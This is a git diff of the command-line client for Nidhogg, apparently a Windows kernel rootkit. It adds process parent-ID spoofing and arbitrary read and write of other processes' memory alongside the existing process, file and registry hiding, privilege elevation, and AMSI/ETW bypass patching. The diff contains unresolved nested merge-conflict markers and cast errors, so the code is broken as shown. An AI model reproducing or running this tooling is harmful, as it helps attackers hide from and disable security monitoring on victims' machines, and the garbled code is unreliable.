@@ -8,6 +8,7 @@ enum class Options {
 	Unknown,
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 	Add, Remove, Clear, Hide, Elevate, Query
 =======
 	Add, Remove, Clear, Hide, Elevate
@@ -15,14 +16,18 @@ enum class Options {
 =======
 	Add, Remove, Clear, Hide, Unhide, Elevate, Query
 >>>>>>> c5ff028 (Seperated hidden and protected registry items)
+=======
+	Add, Remove, Clear, Hide, Unhide, Elevate, Query, Write, Read
+>>>>>>> afd6daf (Nidhogg v0.2)
 };
 
 int PrintUsage() {
 	std::cout << "[ * ] Possible usage:" << std::endl;
-	std::cout << "\tNidhoggClient.exe process [add | remove | clear | hide | elevate | query] [pid | pid1 pid2...]" << std::endl;
+	std::cout << "\tNidhoggClient.exe process [add | remove | clear | hide | elevate | query | spoof | unspoof] [pid | pid1 pid2...] [ppid to spoof]" << std::endl;
 	std::cout << "\tNidhoggClient.exe file [add | remove | clear | query] [path]" << std::endl;
 	std::cout << "\tNidhoggClient.exe reg [add | remove | clear | hide | unhide | query] [key] [value]" << std::endl;
-	std::cout << "\tNidhoggClient.exe patch [pid] [amsi | etw | module name] [function] [patch comma seperated]" << std::endl;	
+	std::cout << "\tNidhoggClient.exe patch [pid] [amsi | etw | module name] [function] [patch comma seperated]" << std::endl;
+	std::cout << "\tNidhoggClient.exe [write | read] [pid] [remote address] [size] [mode]" << std::endl;
 	return 1;
 }
 
@@ -98,6 +103,18 @@ std::vector<byte> ConvertToVector(std::wstring rawPatch) {
 >>>>>>> da4b5b2 (Added patching to the usermode side)
 }
 
+int ConvertToInt(std::wstring rawString) {
+	std::wstringstream rawPatchStream(rawString);
+	std::wstringstream convertedString;
+
+	for (wchar_t i; rawPatchStream >> i; rawPatchStream.good()) {
+		convertedString << std::hex << i;
+	}
+	
+	return _wtoi(convertedString.str().c_str());
+}
+
+
 int wmain(int argc, const wchar_t* argv[]) {
 	std::vector<DWORD> pids;
 	Options option;
@@ -106,7 +123,7 @@ int wmain(int argc, const wchar_t* argv[]) {
 	if (argc < 3)
 		return PrintUsage();
 
-	if (_wcsicmp(argv[1], L"patch") != 0) {
+	if (_wcsicmp(argv[1], L"patch") != 0 && _wcsicmp(argv[1], L"write") != 0 && _wcsicmp(argv[1], L"read") != 0) {
 		if (_wcsicmp(argv[2], L"add") == 0)
 			option = Options::Add;
 		else if (_wcsicmp(argv[2], L"remove") == 0)
@@ -242,7 +259,6 @@ int wmain(int argc, const wchar_t* argv[]) {
 			}
 			break;
 		}
-
 		case Options::Query:
 		{
 			if (_wcsicmp(argv[1], L"process") == 0) {
@@ -353,6 +369,7 @@ int wmain(int argc, const wchar_t* argv[]) {
 		}
 		}
 	}
+<<<<<<< HEAD
 	else {
 <<<<<<< HEAD
 		std::cout << "[ - ] Unknown option." << std::endl;
@@ -572,6 +589,9 @@ int wmain(int argc, const wchar_t* argv[]) {
 		break;
 	}
 =======
+=======
+	else if (_wcsicmp(argv[1], L"patch") == 0) {
+>>>>>>> afd6daf (Nidhogg v0.2)
 		if (argc != 6 && argc != 4)
 			return PrintUsage();
 
@@ -581,7 +601,7 @@ int wmain(int argc, const wchar_t* argv[]) {
 			std::cerr << "[ - ] Invalid PID." << std::endl;
 			return PrintUsage();
 		}
-		
+
 		if (_wcsicmp(argv[3], L"amsi") == 0) {
 			success = NidhoggAmsiBypass(pid);
 		}
@@ -597,8 +617,54 @@ int wmain(int argc, const wchar_t* argv[]) {
 		}
 >>>>>>> da4b5b2 (Added patching to the usermode side)
 	}
+	else {
+		if (argc != 6)
+			return PrintUsage();
+		MODE mode;
 
-	
+		if (_wcsicmp(argv[5], L"kernel") == 0)
+			mode = MODE::KernelMode;
+		else if (_wcsicmp(argv[5], L"user") == 0)
+			mode = MODE::UserMode;
+		else {
+			std::cerr << "[ - ] Invalid mode." << std::endl;
+			return PrintUsage();
+		}
+
+		int pid = _wtoi(argv[2]);
+
+		if (pid == 0) {
+			std::cerr << "[ - ] Invalid PID." << std::endl;
+			return PrintUsage();
+		}
+
+		int size = _wtoi(argv[4]);
+
+		if (size == 0) {
+			std::cerr << "[ - ] Invalid size." << std::endl;
+			return PrintUsage();
+		}
+
+		int remoteAddress = ConvertToInt(argv[3]);
+
+		if (remoteAddress == 0) {
+			std::cerr << "[ - ] Invalid address." << std::endl;
+			return PrintUsage();
+		}
+
+		if (_wcsicmp(argv[1], L"write") == 0)
+			success = NidhoggWriteData(pid, (PVOID)remoteAddress, (SIZE_T)size, mode);
+		else if (_wcsicmp(argv[1], L"read") == 0) {
+			auto data = NidhoggReadData(pid, (PVOID)remoteAddress, (SIZE_T)size, mode);
+
+			if ((int)data < 5)
+				success = (int)data;
+
+			std::cout << "[ + ] You can access the data here" << std::endl;
+		}
+	}
+
+
 	if (success != NIDHOGG_SUCCESS)
 		return Error(success);
 
@@ -606,4 +672,3 @@ int wmain(int argc, const wchar_t* argv[]) {
 
 	return success;
 }
-
